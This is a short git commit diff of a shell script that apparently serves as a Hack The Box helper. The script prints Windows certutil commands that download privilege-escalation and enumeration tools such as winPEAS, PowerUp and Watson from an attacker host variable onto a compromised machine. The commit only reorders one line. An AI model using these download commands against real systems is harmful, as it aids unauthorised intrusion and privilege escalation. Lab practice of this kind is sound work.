8251b46c1f978d390de984f686ed2f730f5d4efd
melnicek <melnicek@pm.me>
2020-09-09 11:58:54 +0200

    Update

--- run.sh
+++ run.sh
@@ -16,9 +16,9 @@ echo "certutil.exe -urlcache -split -f http://$htbip/accesschk.exe accesschk.exe
 echo "certutil.exe -urlcache -split -f http://$htbip/winPEASany.exe winPEASany.exe"
 echo "certutil.exe -urlcache -split -f http://$htbip/Seatbelt.exe Seatbelt.exe"
 echo "certutil.exe -urlcache -split -f http://$htbip/SharpUp.exe SharpUp.exe"
-echo "certutil.exe -urlcache -split -f http://$htbip/Watson.exe Watson.exe"
 echo "certutil.exe -urlcache -split -f http://$htbip/PowerUp.exe PowerUp.exe"
 echo "certutil.exe -urlcache -split -f http://$htbip/Sherlock.exe Sherlock.exe"
+echo "certutil.exe -urlcache -split -f http://$htbip/Watson.exe Watson.exe"
 echo "certutil.exe -urlcache -split -f http://$htbip/jaws-enum.exe jaws-enum.exe"
 echo ""
 
